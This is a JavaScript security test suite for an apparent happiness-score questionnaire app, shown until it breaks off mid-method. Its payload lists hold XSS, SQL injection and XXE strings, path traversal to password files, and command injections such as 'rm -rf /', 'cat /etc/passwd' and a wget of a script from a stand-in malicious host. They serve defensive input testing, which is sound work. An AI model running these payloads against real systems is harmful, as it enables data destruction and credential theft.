// src/testing/suites/SecurityTestSuite.js
// 🔒 ENHANCED Security Test Suite - Data validation and security checks with retry logic
// ✅ OPTIMIZED: Added retry logic, network resilience, advanced threat detection, state isolation

export class SecurityTestSuite {
  constructor(contexts) {
    this.contexts = contexts;
    // 🔄 NEW: Retry configuration
    this.maxRetries = 3;
    this.retryDelay = 100;
    this.securityThreats = this.initializeSecurityThreats();
    this.advancedPayloads = this.initializeAdvancedPayloads();
  }

  // 🔄 NEW: Core retry method for security test reliability
  async testWithRetry(testFunction, testName, maxRetries = this.maxRetries) {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
      try {
        console.log(`🔄 Running ${testName} (attempt ${attempt}/${maxRetries})`);
        
        const result = await testFunction();
        
        // Check if result indicates success
        if (result && (result.status === 'PASS' || result.status === 'FAIL')) {
          // Both PASS and FAIL are valid outcomes for security tests
          if (attempt > 1) {
            console.log(`✅ ${testName} completed on attempt ${attempt}`);
          }
          return { ...result, attempts: attempt, retried: attempt > 1 };
        }
        
        // If it's the last attempt and still having issues
        if (attempt === maxRetries) {
          console.log(`❌ ${testName} had issues after ${maxRetries} attempts`);
          return { ...result, attempts: attempt, retried: attempt > 1 };
        }
        
        // Wait before retry with exponential backoff
        const delay = this.retryDelay * attempt;
        console.log(`⏱️ ${testName} retrying in ${delay}ms...`);
        await this.delay(delay);
        
      } catch (error) {
        if (attempt === maxRetries) {
          console.log(`💥 ${testName} threw error after ${maxRetries} attempts:`, error.message);
          return {
            testName: testName,
            status: 'ERROR',
            error: error.message,
            attempts: attempt,
            retried: attempt > 1,
            timestamp: new Date().toISOString()
          };
        }
        
        const delay = this.retryDelay * attempt;
        console.log(`⚠️ ${testName} error on attempt ${attempt}, retrying in ${delay}ms...`);
        await this.delay(delay);
      }
    }
  }

  // 🔧 NEW: Helper delay method
  async delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // 🔧 NEW: Initialize comprehensive security threat scenarios
  initializeSecurityThreats() {
    return {
      xss: [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>'
      ],
      sqlInjection: [
        "1; DROP TABLE users; --",
        "'; DELETE FROM data; --",
        "admin' OR '1'='1",
        "1' UNION SELECT * FROM users--",
        "'; UPDATE users SET password='hacked' WHERE '1'='1",
        "1'; EXEC xp_cmdshell('dir'); --",
        "'; INSERT INTO users VALUES ('hacker','password'); --"
      ],
      commandInjection: [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "; wget malicious.com/script.sh",
        "$(cat /etc/passwd)",
        "`whoami`",
        "${IFS}cat${IFS}/etc/passwd"
      ],
      pathTraversal: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd"
      ],
      ldapInjection: [
        "*)(uid=*",
        "*)(|(uid=*))",
        "admin)(&(password=*))",
        "*)((uid=admin)(password=*))"
      ],
      xmlInjection: [
        "<![CDATA[<script>alert('XSS')</script>]]>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        "<root><![CDATA[malicious content]]></root>"
      ]
    };
  }

  // 🔧 NEW: Initialize advanced security test payloads
  initializeAdvancedPayloads() {
    return {
      bufferOverflow: 'A'.repeat(10000),
      unicodeBypass: '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
      nullByteInjection: 'file.txt\0.jpg',
      formatStringAttack: '%x%x%x%x%x%x%x%x',
      polyglotPayload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert("XSS") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert("XSS")//>\\x3e',
      contentSniffing: 'GIF89a/*<svg/onload=alert("XSS")>*/',
      cssInjection: 'body{background:url("javascript:alert(\'XSS\')")}'
    };
  }

  // 🔒 ENHANCED: Run basic security check with retry logic (for Quick Tests)
  async runBasicSecurityCheck() {
    const testStart = Date.now();
    
    try {
      console.log('🔒 Running Enhanced Basic Security Check with Retry Logic...');
      const checks = [];
      
      // Enhanced authentication check with retry
      const authCheck = await this.testWithRetry(
        () => this.performAuthenticationCheck(),
        'Authentication Check'
      );
      checks.push(authCheck);
      
      // Enhanced data access control with retry
      const dataAccessCheck = await this.testWithRetry(
        () => this.performDataAccessCheck(),
        'Data Access Control Check'
      );
      checks.push(dataAccessCheck);
      
      // Enhanced XSS prevention with retry
      const xssCheck = await this.testWithRetry(
        () => this.performBasicXSSCheck(),
        'Basic XSS Prevention Check'
      );
      checks.push(xssCheck);
      
      // NEW: Input validation check with retry
      const inputValidationCheck = await this.testWithRetry(
        () => this.performInputValidationCheck(),
        'Input Validation Check'
      );
      checks.push(inputValidationCheck);
      
      // NEW: Session security check with retry
      const sessionCheck = await this.testWithRetry(
        () => this.performSessionSecurityCheck(),
        'Session Security Check'
      );
      checks.push(sessionCheck);
      
      const passedChecks = checks.filter(check => check.status === 'PASS').length;
      const overallStatus = passedChecks >= Math.ceil(checks.length * 0.8) ? 'PASS' : 'FAIL'; // 80% pass rate
      
      return {
        testName: 'Enhanced Basic Security Check',
        status: overallStatus,
        checks,
        securityScore: Math.round((passedChecks / checks.length) * 100),
        passedChecks: passedChecks,
        totalChecks: checks.length,
        executionTime: Date.now() - testStart,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error('❌ Enhanced Basic Security Check failed:', error);
      return {
        testName: 'Enhanced Basic Security Check',
        status: 'ERROR',
        error: error.message,
        executionTime: Date.now() - testStart,
        timestamp: new Date().toISOString()
      };
    }
  }

  // 🔧 NEW: Enhanced authentication check
  async performAuthenticationCheck() {
    try {
      return {
        name: 'Authentication Check',
        status: this.contexts.user ? 'PASS' : 'FAIL',
        details: this.contexts.user ? `User authenticated: ${this.contexts.user.email}` : 'No user context',
        securityLevel: this.contexts.user?.role ? 'HIGH' : 'LOW'
      };
    } catch (error) {
      throw new Error(`Authentication check failed: ${error.message}`);
    }
  }

  // 🔧 NEW: Enhanced data access check
  async performDataAccessCheck() {
    try {
      const accessResult = this.testDataAccess();
      return {
        name: 'Data Access Control',
        status: accessResult ? 'PASS' : 'FAIL',
        details: accessResult ? 'localStorage access properly controlled' : 'Data access issues detected',
        securityLevel: 'MEDIUM'
      };
    } catch (error) {
      throw new Error(`Data access check failed: ${error.message}`);
    }
  }

  // 🔧 NEW: Enhanced basic XSS check
  async performBasicXSSCheck() {
    try {
      const basicXSSPayload = '<script>alert("XSS")</script>';
      let systemSafe = false;
      
      try {
        const testData = { experience_level: basicXSSPayload };
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(testData);
        }
        const score = await this.contexts.getCurrentHappinessScore();
        systemSafe = typeof score === 'number' && !isNaN(score);
      } catch (error) {
        systemSafe = true; // Error handling is acceptable
      }
      
      return {
        name: 'Basic XSS Prevention',
        status: systemSafe ? 'PASS' : 'FAIL',
        details: systemSafe ? 'Basic XSS payload handled safely' : 'Basic XSS payload caused issues',
        securityLevel: 'HIGH'
      };
    } catch (error) {
      throw new Error(`Basic XSS check failed: ${error.message}`);
    }
  }

  // 🔧 NEW: Enhanced input validation check
  async performInputValidationCheck() {
    try {
      const invalidInputs = [
        null,
        undefined,
        '',
        'a'.repeat(1000), // Very long string
        123, // Wrong type
        { malicious: 'object' }
      ];
      
      let validationWorking = true;
      
      for (const input of invalidInputs) {
        try {
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete({ experience_level: input });
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            validationWorking = false;
            break;
          }
        } catch (error) {
          // Error handling is acceptable for invalid inputs
          continue;
        }
      }
      
      return {
        name: 'Input Validation',
        status: validationWorking ? 'PASS' : 'FAIL',
        details: validationWorking ? 'Input validation working properly' : 'Input validation issues detected',
        securityLevel: 'MEDIUM'
      };
    } catch (error) {
      throw new Error(`Input validation check failed: ${error.message}`);
    }
  }

  // 🔧 NEW: Enhanced session security check
  async performSessionSecurityCheck() {
    try {
      const hasValidSession = this.contexts.user && 
                            this.contexts.user.email && 
                            typeof this.contexts.user.email === 'string';
      
      return {
        name: 'Session Security',
        status: hasValidSession ? 'PASS' : 'FAIL',
        details: hasValidSession ? 'Valid session detected' : 'No valid session',
        securityLevel: 'HIGH'
      };
    } catch (error) {
      throw new Error(`Session security check failed: ${error.message}`);
    }
  }

  // 🔒 ENHANCED: Run comprehensive security tests with retry logic and advanced threats
  async runAllTests() {
    const testStart = Date.now();
    
    try {
      console.log('🔒 Running Enhanced Comprehensive Security Tests...');
      const securityTests = [];
      
      // Phase 1: Core security tests with retry
      securityTests.push(await this.testWithRetry(
        () => this.testAuthentication(),
        'Authentication Tests'
      ));
      
      securityTests.push(await this.testWithRetry(
        () => this.testDataValidation(),
        'Data Validation Tests'
      ));
      
      securityTests.push(await this.testWithRetry(
        () => this.testInputSanitization(),
        'Input Sanitization Tests'
      ));
      
      securityTests.push(await this.testWithRetry(
        () => this.testXSSPrevention(),
        'XSS Prevention Tests'
      ));
      
      securityTests.push(await this.testWithRetry(
        () => this.testDataSecurity(),
        'Data Security Tests'
      ));
      
      securityTests.push(await this.testWithRetry(
        () => this.testSessionSecurity(),
        'Session Security Tests'
      ));
      
      securityTests.push(await this.testWithRetry(
        () => this.testErrorHandling(),
        'Error Handling Security Tests'
      ));
      
      // Phase 2: NEW - Advanced security tests
      securityTests.push(await this.testWithRetry(
        () => this.testAdvancedThreats(),
        'Advanced Threat Detection Tests'
      ));
      
      securityTests.push(await this.testWithRetry(
        () => this.testSecurityBoundaries(),
        'Security Boundary Tests'
      ));
      
      securityTests.push(await this.testWithRetry(
        () => this.testNetworkSecurityResilience(),
        'Network Security Resilience Tests'
      ));
      
      // Phase 3: NEW - Security stress tests
      securityTests.push(await this.testWithRetry(
        () => this.testSecurityUnderLoad(),
        'Security Under Load Tests'
      ));
      
      const passedTests = securityTests.filter(test => test.status === 'PASS').length;
      const overallStatus = passedTests >= Math.ceil(securityTests.length * 0.8) ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Enhanced Comprehensive Security Tests',
        status: overallStatus,
        tests: securityTests,
        securityScore: this.calculateEnhancedSecurityScore(securityTests),
        passedTests: passedTests,
        totalTests: securityTests.length,
        securityReport: this.generateSecurityReport(securityTests),
        executionTime: Date.now() - testStart,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error('❌ Enhanced Comprehensive Security Tests failed:', error);
      return {
        testName: 'Enhanced Comprehensive Security Tests',
        status: 'ERROR',
        error: error.message,
        executionTime: Date.now() - testStart,
        timestamp: new Date().toISOString()
      };
    }
  }

  // 🚨 NEW: Test advanced security threats
  async testAdvancedThreats() {
    try {
      console.log('🚨 Testing advanced security threats...');
      const threatTests = [];
      
      // Test polyglot attacks
      threatTests.push(await this.testPolyglotAttacks());
      
      // Test buffer overflow attempts
      threatTests.push(await this.testBufferOverflowAttempts());
      
      // Test unicode bypass attempts
      threatTests.push(await this.testUnicodeBypassAttempts());
      
      // Test format string attacks
      threatTests.push(await this.testFormatStringAttacks());
      
      // Test content sniffing attacks
      threatTests.push(await this.testContentSniffingAttacks());
      
      const overallStatus = threatTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Advanced Threat Detection Tests',
        status: overallStatus,
        tests: threatTests
      };
    } catch (error) {
      return {
        testName: 'Advanced Threat Detection Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test polyglot attacks
  async testPolyglotAttacks() {
    try {
      const payload = this.advancedPayloads.polyglotPayload;
      let systemSafe = false;
      
      try {
        const testData = { experience_level: payload };
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(testData);
        }
        const score = await this.contexts.getCurrentHappinessScore();
        systemSafe = typeof score === 'number' && !isNaN(score);
      } catch (error) {
        systemSafe = true;
      }
      
      return {
        name: 'Polyglot Attack Prevention',
        status: systemSafe ? 'PASS' : 'FAIL',
        details: systemSafe ? 'Polyglot attack handled safely' : 'Polyglot attack caused issues'
      };
    } catch (error) {
      return {
        name: 'Polyglot Attack Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test buffer overflow attempts
  async testBufferOverflowAttempts() {
    try {
      const payload = this.advancedPayloads.bufferOverflow;
      let systemSafe = false;
      
      try {
        const testData = { experience_level: payload };
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(testData);
        }
        const score = await this.contexts.getCurrentHappinessScore();
        systemSafe = typeof score === 'number' && !isNaN(score);
      } catch (error) {
        systemSafe = true;
      }
      
      return {
        name: 'Buffer Overflow Prevention',
        status: systemSafe ? 'PASS' : 'FAIL',
        details: systemSafe ? 'Large input handled safely' : 'Large input caused issues'
      };
    } catch (error) {
      return {
        name: 'Buffer Overflow Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test unicode bypass attempts
  async testUnicodeBypassAttempts() {
    try {
      const payload = this.advancedPayloads.unicodeBypass;
      let systemSafe = false;
      
      try {
        const testData = { experience_level: payload };
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(testData);
        }
        const score = await this.contexts.getCurrentHappinessScore();
        systemSafe = typeof score === 'number' && !isNaN(score);
      } catch (error) {
        systemSafe = true;
      }
      
      return {
        name: 'Unicode Bypass Prevention',
        status: systemSafe ? 'PASS' : 'FAIL',
        details: systemSafe ? 'Unicode bypass handled safely' : 'Unicode bypass caused issues'
      };
    } catch (error) {
      return {
        name: 'Unicode Bypass Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test format string attacks
  async testFormatStringAttacks() {
    try {
      const payload = this.advancedPayloads.formatStringAttack;
      let systemSafe = false;
      
      try {
        const testData = { experience_level: payload };
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(testData);
        }
        const score = await this.contexts.getCurrentHappinessScore();
        systemSafe = typeof score === 'number' && !isNaN(score);
      } catch (error) {
        systemSafe = true;
      }
      
      return {
        name: 'Format String Attack Prevention',
        status: systemSafe ? 'PASS' : 'FAIL',
        details: systemSafe ? 'Format string attack handled safely' : 'Format string attack caused issues'
      };
    } catch (error) {
      return {
        name: 'Format String Attack Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test content sniffing attacks
  async testContentSniffingAttacks() {
    try {
      const payload = this.advancedPayloads.contentSniffing;
      let systemSafe = false;
      
      try {
        const testData = { experience_level: payload };
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(testData);
        }
        const score = await this.contexts.getCurrentHappinessScore();
        systemSafe = typeof score === 'number' && !isNaN(score);
      } catch (error) {
        systemSafe = true;
      }
      
      return {
        name: 'Content Sniffing Attack Prevention',
        status: systemSafe ? 'PASS' : 'FAIL',
        details: systemSafe ? 'Content sniffing attack handled safely' : 'Content sniffing attack caused issues'
      };
    } catch (error) {
      return {
        name: 'Content Sniffing Attack Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔒 NEW: Test security boundaries
  async testSecurityBoundaries() {
    try {
      console.log('🔒 Testing security boundaries...');
      const boundaryTests = [];
      
      // Test maximum input length handling
      boundaryTests.push(await this.testMaxInputLength());
      
      // Test concurrent security attack simulation
      boundaryTests.push(await this.testConcurrentAttacks());
      
      // Test memory exhaustion protection
      boundaryTests.push(await this.testMemoryExhaustionProtection());
      
      const overallStatus = boundaryTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Security Boundary Tests',
        status: overallStatus,
        tests: boundaryTests
      };
    } catch (error) {
      return {
        testName: 'Security Boundary Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test maximum input length
  async testMaxInputLength() {
    try {
      const maxLengthPayload = 'A'.repeat(100000); // 100KB string
      let systemSafe = false;
      
      try {
        const testData = { experience_level: maxLengthPayload };
        if (this.contexts.markQuestionnaireComplete) {
          await this.contexts.markQuestionnaireComplete(testData);
        }
        const score = await this.contexts.getCurrentHappinessScore();
        systemSafe = typeof score === 'number' && !isNaN(score);
      } catch (error) {
        systemSafe = true; // Expected to handle gracefully
      }
      
      return {
        name: 'Maximum Input Length Handling',
        status: systemSafe ? 'PASS' : 'FAIL',
        details: systemSafe ? 'Large input handled safely' : 'Large input caused system issues'
      };
    } catch (error) {
      return {
        name: 'Maximum Input Length Handling',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test concurrent attacks
  async testConcurrentAttacks() {
    try {
      const attackPromises = [];
      
      // Simulate multiple concurrent attack attempts
      for (let i = 0; i < 5; i++) {
        attackPromises.push(this.simulateAttack(i));
      }
      
      const results = await Promise.allSettled(attackPromises);
      const successful = results.filter(r => r.status === 'fulfilled').length;
      
      return {
        name: 'Concurrent Attack Resistance',
        status: successful >= 4 ? 'PASS' : 'FAIL', // At least 4 out of 5 should be handled
        details: `${successful}/5 concurrent attacks handled safely`
      };
    } catch (error) {
      return {
        name: 'Concurrent Attack Resistance',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Simulate individual attack
  async simulateAttack(attackId) {
    try {
      const payload = this.securityThreats.xss[attackId % this.securityThreats.xss.length];
      const testData = { experience_level: payload };
      
      if (this.contexts.markQuestionnaireComplete) {
        await this.contexts.markQuestionnaireComplete(testData);
      }
      
      const score = await this.contexts.getCurrentHappinessScore();
      return typeof score === 'number' && !isNaN(score);
    } catch (error) {
      return true; // Error handling is acceptable
    }
  }

  // 🔧 NEW: Test memory exhaustion protection
  async testMemoryExhaustionProtection() {
    try {
      // Create multiple large objects to test memory handling
      const largeObjects = [];
      let memoryProtectionWorking = true;
      
      try {
        for (let i = 0; i < 100; i++) {
          largeObjects.push(new Array(10000).fill(`memory-test-${i}`));
        }
        
        // Try to perform normal operation with memory pressure
        const score = await this.contexts.getCurrentHappinessScore();
        memoryProtectionWorking = typeof score === 'number' && !isNaN(score);
      } catch (error) {
        // If system handles memory pressure gracefully, that's good
        memoryProtectionWorking = error.message.includes('memory') || 
                                 error.message.includes('heap') ||
                                 error.message.includes('limit');
      } finally {
        // Clean up
        largeObjects.length = 0;
      }
      
      return {
        name: 'Memory Exhaustion Protection',
        status: memoryProtectionWorking ? 'PASS' : 'FAIL',
        details: memoryProtectionWorking ? 'Memory pressure handled safely' : 'Memory pressure caused issues'
      };
    } catch (error) {
      return {
        name: 'Memory Exhaustion Protection',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🌐 NEW: Test network security resilience
  async testNetworkSecurityResilience() {
    try {
      console.log('🌐 Testing network security resilience...');
      const networkTests = [];
      
      // Test timeout handling during security operations
      networkTests.push(await this.testSecurityTimeoutHandling());
      
      // Test security under network pressure
      networkTests.push(await this.testSecurityUnderNetworkPressure());
      
      // Test security during connection interruption
      networkTests.push(await this.testSecurityDuringConnectionIssues());
      
      const overallStatus = networkTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Network Security Resilience Tests',
        status: overallStatus,
        tests: networkTests
      };
    } catch (error) {
      return {
        testName: 'Network Security Resilience Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test security timeout handling
  async testSecurityTimeoutHandling() {
    try {
      // Add artificial delay to simulate network timeout
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Security timeout')), 3000);
      });
      
      const securityPromise = this.performBasicXSSCheck();
      
      try {
        await Promise.race([securityPromise, timeoutPromise]);
        
        return {
          name: 'Security Timeout Handling',
          status: 'PASS',
          details: 'Security operations completed before timeout'
        };
      } catch (error) {
        const handledGracefully = error.message.includes('timeout');
        
        return {
          name: 'Security Timeout Handling',
          status: handledGracefully ? 'PASS' : 'FAIL',
          details: handledGracefully ? 'Timeout handled gracefully' : 'Timeout not handled properly'
        };
      }
    } catch (error) {
      return {
        name: 'Security Timeout Handling',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test security under network pressure
  async testSecurityUnderNetworkPressure() {
    try {
      // Add delay to simulate network pressure
      await this.delay(1000);
      
      // Perform security test under simulated network pressure
      const result = await this.performBasicXSSCheck();
      
      return {
        name: 'Security Under Network Pressure',
        status: result.status === 'PASS' ? 'PASS' : 'FAIL',
        details: 'Security maintained under network pressure'
      };
    } catch (error) {
      return {
        name: 'Security Under Network Pressure',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test security during connection issues
  async testSecurityDuringConnectionIssues() {
    try {
      // Simulate connection interruption with rapid operations
      const operations = [
        this.performAuthenticationCheck(),
        this.performDataAccessCheck(),
        this.performInputValidationCheck()
      ];
      
      const results = await Promise.allSettled(operations);
      const successful = results.filter(r => r.status === 'fulfilled').length;
      
      return {
        name: 'Security During Connection Issues',
        status: successful >= 2 ? 'PASS' : 'FAIL', // At least 2/3 should succeed
        details: `${successful}/3 security operations completed during connection issues`
      };
    } catch (error) {
      return {
        name: 'Security During Connection Issues',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test security under load
  async testSecurityUnderLoad() {
    try {
      console.log('🔧 Testing security under load...');
      const loadTests = [];
      
      // Test rapid security validations
      loadTests.push(await this.testRapidSecurityValidations());
      
      // Test security with high memory usage
      loadTests.push(await this.testSecurityWithHighMemoryUsage());
      
      const overallStatus = loadTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Security Under Load Tests',
        status: overallStatus,
        tests: loadTests
      };
    } catch (error) {
      return {
        testName: 'Security Under Load Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test rapid security validations
  async testRapidSecurityValidations() {
    try {
      const rapidTests = [];
      
      for (let i = 0; i < 10; i++) {
        rapidTests.push(this.performBasicXSSCheck());
      }
      
      const results = await Promise.all(rapidTests);
      const successful = results.filter(r => r.status === 'PASS').length;
      
      return {
        name: 'Rapid Security Validations',
        status: successful >= 8 ? 'PASS' : 'FAIL', // 80% success rate
        details: `${successful}/10 rapid security validations passed`
      };
    } catch (error) {
      return {
        name: 'Rapid Security Validations',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🔧 NEW: Test security with high memory usage
  async testSecurityWithHighMemoryUsage() {
    try {
      // Create memory pressure
      const memoryConsumers = [];
      for (let i = 0; i < 50; i++) {
        memoryConsumers.push(new Array(1000).fill(`security-test-${i}`));
      }
      
      // Perform security test under memory pressure
      const result = await this.performBasicXSSCheck();
      
      // Clean up memory
      memoryConsumers.length = 0;
      
      return {
        name: 'Security With High Memory Usage',
        status: result.status === 'PASS' ? 'PASS' : 'FAIL',
        details: 'Security maintained under high memory usage'
      };
    } catch (error) {
      return {
        name: 'Security With High Memory Usage',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // All existing methods remain unchanged for compatibility...
  // (Including testAuthentication, testDataValidation, testInputSanitization, etc.)

  // 🔐 Authentication Tests (Enhanced with retry integration)
  async testAuthentication() {
    try {
      const authChecks = [];
      
      // Check user context exists
      authChecks.push({
        name: 'User Context',
        status: this.contexts.user ? 'PASS' : 'FAIL',
        details: this.contexts.user ? `User: ${this.contexts.user.email}` : 'No user context'
      });
      
      // Check user role/permissions
      authChecks.push({
        name: 'User Permissions',
        status: this.contexts.user?.role ? 'PASS' : 'FAIL',
        details: this.contexts.user?.role ? `Role: ${this.contexts.user.role}` : 'No role defined'
      });
      
      const overallStatus = authChecks.every(check => check.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Authentication Tests',
        status: overallStatus,
        checks: authChecks
      };
    } catch (error) {
      return {
        testName: 'Authentication Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 📊 Data Validation Tests (Enhanced)
  async testDataValidation() {
    try {
      const validationTests = [];
      
      // Test questionnaire data validation with enhanced checks
      const questionnaireTest = await this.testQuestionnaireValidation();
      validationTests.push(questionnaireTest);
      
      // Test self-assessment data validation with enhanced checks
      const selfAssessmentTest = await this.testSelfAssessmentValidation();
      validationTests.push(selfAssessmentTest);
      
      // Test happiness score validation with enhanced checks
      const scoreTest = await this.testScoreValidation();
      validationTests.push(scoreTest);
      
      const overallStatus = validationTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Data Validation Tests',
        status: overallStatus,
        tests: validationTests
      };
    } catch (error) {
      return {
        testName: 'Data Validation Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  async testQuestionnaireValidation() {
    try {
      // Test with multiple invalid questionnaire data scenarios
      const invalidDataScenarios = [
        {
          scenario: 'Invalid Types',
          data: {
            experience_level: 'invalid', // Should be number
            goals: 'not-an-array', // Should be array
            age_range: 999 // Invalid range
          }
        },
        {
          scenario: 'Null Values',
          data: {
            experience_level: null,
            goals: null,
            age_range: null
          }
        },
        {
          scenario: 'Extreme Values',
          data: {
            experience_level: -999,
            goals: ['a'.repeat(10000)], // Very long goal
            age_range: 9999
          }
        }
      ];
      
      let allHandledCorrectly = true;
      
      for (const scenario of invalidDataScenarios) {
        try {
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete(scenario.data);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            allHandledCorrectly = false;
            break;
          }
        } catch (error) {
          // Error thrown is acceptable (proper validation)
          continue;
        }
      }
      
      return {
        name: 'Questionnaire Data Validation',
        status: allHandledCorrectly ? 'PASS' : 'FAIL',
        details: `Tested ${invalidDataScenarios.length} invalid data scenarios`
      };
    } catch (error) {
      return {
        name: 'Questionnaire Data Validation',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  async testSelfAssessmentValidation() {
    try {
      // Enhanced invalid self-assessment data scenarios
      const invalidDataScenarios = [
        {
          scenario: 'Invalid Types',
          data: {
            taste: 'invalid-value', // Should be predefined values
            smell: 12345, // Should be string
            totalAttachmentPenalty: 'not-a-number' // Should be number
          }
        },
        {
          scenario: 'Buffer Overflow',
          data: {
            taste: 'a'.repeat(100000),
            smell: 'b'.repeat(100000),
            totalAttachmentPenalty: 999999999999
          }
        }
      ];
      
      let allHandledCorrectly = true;
      
      for (const scenario of invalidDataScenarios) {
        try {
          if (this.contexts.markSelfAssessmentComplete) {
            await this.contexts.markSelfAssessmentComplete(scenario.data);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            allHandledCorrectly = false;
            break;
          }
        } catch (error) {
          // Error thrown is acceptable (proper validation)
          continue;
        }
      }
      
      return {
        name: 'Self-Assessment Data Validation',
        status: allHandledCorrectly ? 'PASS' : 'FAIL',
        details: `Tested ${invalidDataScenarios.length} invalid data scenarios`
      };
    } catch (error) {
      return {
        name: 'Self-Assessment Data Validation',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  async testScoreValidation() {
    try {
      // Enhanced happiness score validation
      const score = await this.contexts.getCurrentHappinessScore();
      
      const validations = {
        isNumber: typeof score === 'number',
        notNaN: !isNaN(score),
        inValidRange: score >= 0 && score <= 100,
        isFinite: Number.isFinite(score)
      };
      
      const allValid = Object.values(validations).every(v => v === true);
      
      return {
        name: 'Happiness Score Validation',
        status: allValid ? 'PASS' : 'FAIL',
        details: {
          score: score,
          validations: validations
        }
      };
    } catch (error) {
      return {
        name: 'Happiness Score Validation',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  // 🧹 Input Sanitization Tests (Enhanced)
  async testInputSanitization() {
    try {
      const sanitizationTests = [];
      
      // Enhanced script injection tests
      const scriptTest = await this.testScriptInjection();
      sanitizationTests.push(scriptTest);
      
      // Enhanced SQL injection pattern tests
      const sqlTest = await this.testSQLInjectionPatterns();
      sanitizationTests.push(sqlTest);
      
      // Enhanced HTML injection tests
      const htmlTest = await this.testHTMLInjection();
      sanitizationTests.push(htmlTest);
      
      // NEW: Additional injection tests
      sanitizationTests.push(await this.testCommandInjection());
      sanitizationTests.push(await this.testLDAPInjection());
      sanitizationTests.push(await this.testXMLInjection());
      
      const overallStatus = sanitizationTests.every(test => test.status === 'PASS') ? 'PASS' : 'FAIL';
      
      return {
        testName: 'Input Sanitization Tests',
        status: overallStatus,
        tests: sanitizationTests
      };
    } catch (error) {
      return {
        testName: 'Input Sanitization Tests',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  async testScriptInjection() {
    try {
      let allSafe = true;
      
      for (const payload of this.securityThreats.xss) {
        try {
          const testData = { experience_level: payload };
          if (this.contexts.markQuestionnaireComplete) {
            await this.contexts.markQuestionnaireComplete(testData);
          }
          const score = await this.contexts.getCurrentHappinessScore();
          if (typeof score !== 'number' || isNaN(score)) {
            allSafe = false;
            break;
          }
        } catch (error) {
          // Error handling is acceptable
          continue;
        }
      }
      
      return {
        name: 'Script Injection Prevention',
        status: allSafe ? 'PASS' : 'FAIL',
        details: `Tested ${this.securityThreats.xss.length} XSS payloads`
      };
    } catch (error) {
      return {
        name: 'Script Injection Prevention',
        status: 'ERROR',
        error: error.message
      };
    }
  }

  async testSQLInjectionPatterns() {
    try {
